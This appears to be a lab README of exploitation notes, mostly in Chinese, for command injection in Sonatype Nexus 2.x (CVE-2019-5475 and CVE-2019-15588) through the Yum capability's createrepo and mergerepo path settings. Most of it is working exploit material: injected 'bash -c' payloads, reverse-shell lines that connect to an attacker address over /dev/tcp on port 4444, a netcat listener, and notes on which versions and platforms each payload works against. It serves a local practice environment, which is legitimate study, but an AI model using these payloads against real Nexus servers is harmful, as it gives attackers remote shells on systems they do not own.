# CVE-2019-5475
> CVE-2019-5475 靶场: RCE 漏洞

------



https://paper.seebug.org/1260/
【CVE-2019-5475 Nexus 2.x命令注入】 漏洞分析

https://github.com/jaychouzzk/CVE-2019-5475-Nexus-Repository-Manager-
https://blog.spoock.com/2018/11/25/getshell-bypass-exec/
https://qiita.com/shimizukawasaki/items/41794616f1f2e602e4f5



http://127.0.0.1:8081/nexus/#capabilities

等待反弹shell
docker exec -it -u root `docker ps -aq --filter name=docker_attacker` /bin/bash
nc -lvvp 4444


均可利用
Path of "createrepo"
Path of "mergerepo"  


CVE-2019-5475
https://github.com/sonatype/nexus-public/blob/release-2.14.9-01/plugins/yum/nexus-yum-repository-plugin/src/main/java/org/sonatype/nexus/yum/internal/capabilities/YumCapability.java#L82
https://github.com/sonatype/nexus-public/tree/release-2.14.9-01
sonatype/nexus:2.14.9-01  
payload:  bash -c id || python
exp:      bash -c $@|bash 0 echo bash -i >&/dev/tcp/172.168.50.2/4444 0>&1 || python


CVE-2019-15588
环境变量问题，必须写 /bin/bash
https://github.com/sonatype/nexus-public/tree/release-2.14.14-01
sonatype/nexus:2.14.14-01  payload
payload:  /bin/bash -c id || /createrepo
exp:      /bin/bash -c $@|/bin/bash 0 echo /bin/bash -i >&/dev/tcp/172.168.50.2/4444 0>&1 || /createrepo


https://github.com/sonatype/nexus-public/tree/release-2.14.15-01
sonatype/nexus:2.14.15-01  payload
? 


sonatype/nexus:2.14.9-01 ： windows 利用
sonatype/nexus:2.14.14-01 ： Linux 利用
sonatype/nexus:2.14.15-01 ： windows 利用 (配合构件上传功能创建目录)